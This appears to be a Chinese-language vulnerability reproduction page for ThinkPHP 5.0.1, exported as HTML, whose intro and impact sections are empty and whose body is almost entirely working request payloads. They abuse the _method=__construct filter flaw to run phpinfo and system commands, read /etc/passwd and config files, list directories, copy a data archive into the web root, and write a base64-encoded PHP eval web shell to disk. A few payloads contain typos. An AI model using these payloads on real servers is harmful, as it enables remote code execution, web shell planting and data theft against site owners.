<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.csBF12A472{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs6EDCDAE2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="thinkphp-501"><span class="csDE05BCC">Thinkphp 5.0.1</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<h2 class="cs868C439D">
			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="X2eae1f6b1c96690c8459585358c3a6a84b52e4d"><span class="csD1E291E2">1</span><span class="csD6CA00D2">、判断是否存在漏洞</span></a></h3>
		<h4 class="cs868C439D">
			<a name="poc1"><span class="csBF12A472">poc1</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">http://wwww.com/public</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">s=phpinfo()&amp;_method=__construct&amp;filter=assert</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;server[]=phpinfo&amp;get[]=phpinfo</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;get[]=phpinfo</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;get[0]=phpinfo&amp;get[1]=1</span></p><h4 class="cs868C439D">
			<a name="poc2"><span class="csBF12A472">poc2</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">http:/xxxx.com/?s=index/index/index</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">s=ipconfig&amp;_mehthod=__construct$method=&amp;filter[]=system</span></p><h3 class="cs868C439D">
			<a name="X2ca2273453ae82ba20d4d77c3cf6647e96532fc"><span class="csD1E291E2">2</span><span class="csD6CA00D2">、深入利用</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">使用</span><span class="cs8926E06">post</span><span class="cs9C1B1871">提交</span></p><h4 class="cs868C439D">
			<a name="Xe8337418d4acac31cf5c2db9427a2c08ec1c693"><span class="csBF12A472">1</span><span class="cs6EDCDAE2">、使用</span><span class="csBF12A472">assert</span><span class="cs6EDCDAE2">函数</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">s=phpinfo()&amp;_method=__construct&amp;filter=assert</span></p><h4 class="cs868C439D">
			<a name="X47b765d0482d8cb865c4f1d16a52bad06648c88"><span class="csBF12A472">2</span><span class="cs6EDCDAE2">、</span><span class="csBF12A472">include</span><span class="cs6EDCDAE2">函数，可以根据此函数查看一些文件及其配置</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">s=include(&quot;/etc/passwd&quot;)&amp;_method=__construct&amp;filter=assert</span></p><h4 class="cs868C439D">
			<a name="X8ad3a8033f6146d89ef1ea0e7e06eb03d40d5b5"><span class="csBF12A472">3</span><span class="cs6EDCDAE2">、</span><span class="csBF12A472">file_put_contents</span><span class="cs6EDCDAE2">函数，可以直接写入文件</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">s=file_put_contents(&#39;/data/wwwroot/www.0-sec.org/application/index/test.php&#39;,base64_decode(&#39;PD9waHAgJHBhc3M9JF9QT1NUWydhYWFhJ107ZXZhbCgkcGFzcyk7Pz4&#39;))&amp;_method=__construct&amp;filter=assert</span></p><h4 class="cs868C439D">
			<a name="Xb4baeab1e96d334359d5fda24f0f8b244f4fdd7"><span class="csBF12A472">4</span><span class="cs6EDCDAE2">、读取文件</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;server[]=phpinfo&amp;get[]=../application/.htaccess</span></p><p class="cs3A447A38"><span class="cs9FB05234">s=include(&quot;../application/.htaccess&quot;)&amp;_method=__construct&amp;filter=assert</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">//ps:</span><span class="cs7FFD2630">如果不加</span><span class="cs9FB05234">.. </span><span class="cs7FFD2630">请加上完整路径</span></p><h4 class="cs868C439D">
			<a name="Xcd2a4a7913927c7167399c7feec47c088872e78"><span class="csBF12A472">5</span><span class="cs6EDCDAE2">、</span><span class="csBF12A472">var_dump</span><span class="cs6EDCDAE2">函数，可以查看该路径下的文件，文件夹</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">s=var_dump(scandir(&#39;../application/&#39;))&amp;_method=__construct&amp;filter=assert</span></p><h4 class="cs868C439D">
			<a name="X7e80bc7754b88cceaac5a74ca38dc52bdafa2c4"><span class="csBF12A472">6</span><span class="cs6EDCDAE2">、复制文件</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">s=copy(&quot;/data/wwwroot/data.tar&quot;, &quot;/data/wwwroot/www.0-sec.org/public/data.tar&quot;)&amp;_method=__construct&amp;filter=asser</span></p></body>
</html>
